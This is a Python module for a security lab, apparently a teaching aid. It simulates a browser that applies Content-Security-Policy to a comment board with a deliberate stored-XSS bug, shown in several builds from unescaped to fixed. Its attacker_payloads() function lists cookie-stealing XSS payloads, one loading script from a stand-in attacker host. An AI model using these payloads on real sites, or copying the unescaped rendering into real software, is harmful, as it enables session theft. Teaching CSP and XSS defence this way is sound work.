"""A fake browser that applies Content-Security-Policy to decide which scripts would run.

No JavaScript is executed. "Running" a script means recording its text in `executed`.
The model covers what the lab needs: inline <script> blocks, <script src>, inline event
handlers (onerror=...), javascript: URLs, nonces, sha256 hashes, 'unsafe-inline',
'self', host sources, default-src fallback and Report-Only mode.
It is a teaching model, not a full CSP Level 3 implementation (verify edge cases on MDN).

The app is a comment board with a stored-XSS bug, in four builds:
  vulnerable      : no escaping, no CSP
  csp_only        : still no escaping (the bug is there), but a nonce-based CSP
  unsafe_inline   : no escaping, CSP that allows 'unsafe-inline' (useless)
  fixed           : html.escape + nonce CSP (defense in depth)
"""
from __future__ import annotations

import base64
import hashlib
import html
import re
import secrets
from dataclasses import dataclass, field
from urllib.parse import urlparse

SCRIPT_RE = re.compile(r"<script(?P<attrs>[^>]*)>(?P<body>.*?)</script>", re.S | re.I)
HANDLER_RE = re.compile(r"<[a-z]+[^>]*?\s(on[a-z]+)\s*=\s*(\"[^\"]*\"|'[^']*'|[^\s>]+)", re.I)
JS_URL_RE = re.compile(r"""href\s*=\s*["']?\s*javascript:([^"'>]*)""", re.I)
ATTR_RE = re.compile(r"""(\w[\w-]*)\s*=\s*("([^"]*)"|'([^']*)'|([^\s>]+))""")


def _attrs(s: str) -> dict[str, str]:
    return {m.group(1).lower(): next(g for g in m.groups()[2:] if g is not None) for m in ATTR_RE.finditer(s)}


def _parse_csp(v: str) -> dict[str, list[str]]:
    out: dict[str, list[str]] = {}
    for part in v.split(";"):
        t = part.strip().split()
        if t and t[0].lower() not in out:
            out[t[0].lower()] = t[1:]
    return out


def sha256_source(script_text: str) -> str:
    return "'sha256-" + base64.b64encode(hashlib.sha256(script_text.encode()).digest()).decode() + "'"


@dataclass
class PageResult:
    executed: list[str] = field(default_factory=list)
    blocked: list[str] = field(default_factory=list)
    reports: list[str] = field(default_factory=list)


class FakeBrowser:
    def __init__(self, origin: str = "https://shop.example"):
        self.origin = origin

    def _script_sources(self, csp: dict[str, list[str]] | None) -> list[str] | None:
        if csp is None:
            return None
        return csp.get("script-src", csp.get("default-src"))

    def _allowed_inline(self, src: list[str] | None, body: str, nonce: str | None, handler: bool) -> bool:
        if src is None:
            return True
        has_nonce_hash = any(s.startswith(("'nonce-", "'sha256-")) for s in src)
        if handler:  # event handlers / javascript: URLs: only 'unsafe-inline' (and no nonce/hash present)
            return "'unsafe-inline'" in src and not has_nonce_hash
        if nonce and f"'nonce-{nonce}'" in src:
            return True
        if sha256_source(body) in src:
            return True
        return "'unsafe-inline'" in src and not has_nonce_hash

    def _allowed_external(self, src: list[str] | None, url: str, nonce: str | None) -> bool:
        if src is None:
            return True
        if nonce and f"'nonce-{nonce}'" in src:
            return True
        if "'strict-dynamic'" in src:
            return False  # host allowlists are ignored under strict-dynamic; only nonced/trusted loads
        u = urlparse(url if "://" in url else self.origin + "/" + url.lstrip("/"))
        origin = f"{u.scheme}://{u.netloc}"
        for s in src:
            if s == "'self'" and origin == self.origin:
                return True
            if s == "*" or s == f"{u.scheme}:":
                return True
            if s.rstrip("/") == origin:
                return True
            if s.startswith("https://*.") and u.netloc.endswith(s[len("https://*"):]):
                return True
        return False

    def load(self, body: str, headers: dict[str, str]) -> PageResult:
        h = {k.lower(): v for k, v in headers.items()}
        enforce = _parse_csp(h["content-security-policy"]) if "content-security-policy" in h else None
        report_only = _parse_csp(h["content-security-policy-report-only"]) if "content-security-policy-report-only" in h else None
        res = PageResult()

        def decide(label: str, allowed_enforce: bool, allowed_report: bool) -> None:
            if not allowed_report:
                res.reports.append(label)
            if allowed_enforce:
                res.executed.append(label)
            else:
                res.blocked.append(label)
                res.reports.append(label)

        for m in SCRIPT_RE.finditer(body):
            a = _attrs(m.group("attrs"))
            nonce = a.get("nonce")
            if "src" in a:
                label = f"external:{a['src']}"
                decide(label, self._allowed_external(self._script_sources(enforce), a["src"], nonce),
                       self._allowed_external(self._script_sources(report_only), a["src"], nonce))
            else:
                text = m.group("body")
                label = f"inline:{text.strip()}"
                decide(label, self._allowed_inline(self._script_sources(enforce), text, nonce, False),
                       self._allowed_inline(self._script_sources(report_only), text, nonce, False))
        for m in HANDLER_RE.finditer(body):
            label = f"handler:{m.group(1)}={m.group(2).strip(chr(34) + chr(39))}"
            decide(label, self._allowed_inline(self._script_sources(enforce), "", None, True),
                   self._allowed_inline(self._script_sources(report_only), "", None, True))
        for m in JS_URL_RE.finditer(body):
            label = f"javascript-url:{m.group(1)}"
            decide(label, self._allowed_inline(self._script_sources(enforce), "", None, True),
                   self._allowed_inline(self._script_sources(report_only), "", None, True))
        res.reports = list(dict.fromkeys(res.reports))
        return res


# ------------------------------------------------------------------ the app
APP_SCRIPT = "initCommentWidget()"


class CommentBoard:
    BUILDS = ("vulnerable", "csp_only", "unsafe_inline", "fixed", "report_only", "static_nonce")

    def __init__(self, build: str):
        assert build in self.BUILDS
        self.build = build
        self.comments: list[str] = []

    def post(self, text: str) -> None:
        self.comments.append(text)

    def render(self) -> tuple[str, dict[str, str]]:
        nonce = "static123" if self.build == "static_nonce" else secrets.token_urlsafe(16)
        escape = self.build == "fixed"
        items = "".join(f"<li>{html.escape(c) if escape else c}</li>" for c in self.comments)
        page = (f"<html><body><ul>{items}</ul>"
                f'<script nonce="{nonce}">{APP_SCRIPT}</script>'
                f'<script nonce="{nonce}" src="/static/app.js"></script></body></html>')
        strict = f"script-src 'nonce-{nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'"
        headers = {
            "vulnerable": {},
            "csp_only": {"Content-Security-Policy": strict},
            "fixed": {"Content-Security-Policy": strict},
            "static_nonce": {"Content-Security-Policy": strict},
            "unsafe_inline": {"Content-Security-Policy": "script-src 'self' 'unsafe-inline'"},
            "report_only": {"Content-Security-Policy-Report-Only": strict},
        }[self.build]
        return page, headers


def attacker_payloads() -> list[str]:
    return [
        "<script>steal(document.cookie)</script>",
        '<img src=x onerror="steal(document.cookie)">',
        '<a href="javascript:steal(document.cookie)">win a prize</a>',
        '<script src="https://evil.attacker.test/x.js"></script>',
    ]


def stolen(result: PageResult) -> bool:
    return any("steal" in e or "evil.attacker" in e for e in result.executed)
